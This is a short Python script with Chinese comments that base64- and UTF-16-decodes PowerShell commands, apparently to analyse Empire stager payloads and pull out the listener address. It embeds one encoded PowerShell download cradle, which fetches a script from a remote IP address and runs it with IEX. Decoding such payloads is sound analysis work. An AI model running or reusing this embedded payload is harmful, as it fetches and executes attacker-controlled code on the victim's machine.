import base64


def gen_enc_cmd(plain_cmd: str) -> str:
    """将 cmd 先 Unicode 编码然后 base64 编码"""
    utf_16_le_cmd = plain_cmd.encode("utf-16-le")
    utf_8_cmd = plain_cmd.encode("utf-8")
    utf_16_be_cmd = plain_cmd.encode("utf-16-be")
    base64_cmd = base64.b64encode(utf_8_cmd)
    base64_utf_16_le_cmd = base64.b64encode(utf_16_le_cmd)
    base64_utf_16_be_cmd = base64.b64encode(utf_16_be_cmd)

    print(f"UTF-8 编码: {utf_8_cmd}")
    print(f"UTF-16 LE 编码: {utf_16_le_cmd}")
    print(f"UTF-16 BE 编码: {utf_16_be_cmd}")
    print(f"Base64 编码: {base64_cmd}")
    print(f"Base64 UTF-16 LE 编码: {base64_utf_16_le_cmd}")
    print(f"Base64 UTF-16 BE 编码: {base64_utf_16_be_cmd}")


def encode_command(plain_cmd: str) -> str:
    """ "将 plain_cmd 先 utf-16 le 编码然后 base64 编码"""
    return base64.b64encode(plain_cmd.encode("utf-16-le"))


def decode_command(enc_cmd: str, encoding: str = "utf-16-le") -> str:
    """将 enc_cmd 先 base64 解码然后 utf-16 le 解码"""
    if encoding == "utf-16-le":
        return base64.b64decode(enc_cmd).decode("utf-16-le")
    return base64.b64decode(enc_cmd).decode(f"{encoding}")


enc_cmd = "WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB2AFkAdgBsAGkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAdgBZAHYAbABpAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAdgBZAHYAbABpAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADAALgAxAC4AMQAuADEAMwAxADoAOAAwADgAMAAvAHAAYQBrAGgAbgBBAEEAagBMAGUAMAB3AGwAJwApACkAOwA="
dec_cmd = decode_command(enc_cmd)
print(f"{enc_cmd} 解码后的命令为:\n{dec_cmd}")
# 提取目标 listener 地址
# empire_base64_str = dec_cmd.split("GetString([Convert]::FromBase64String('")[1].split(
#     "'))"
# )[0]
# empire_plain_str = decode_command(empire_base64_str, "utf-8")
# print(f"目标Listener地址为: {empire_plain_str}")
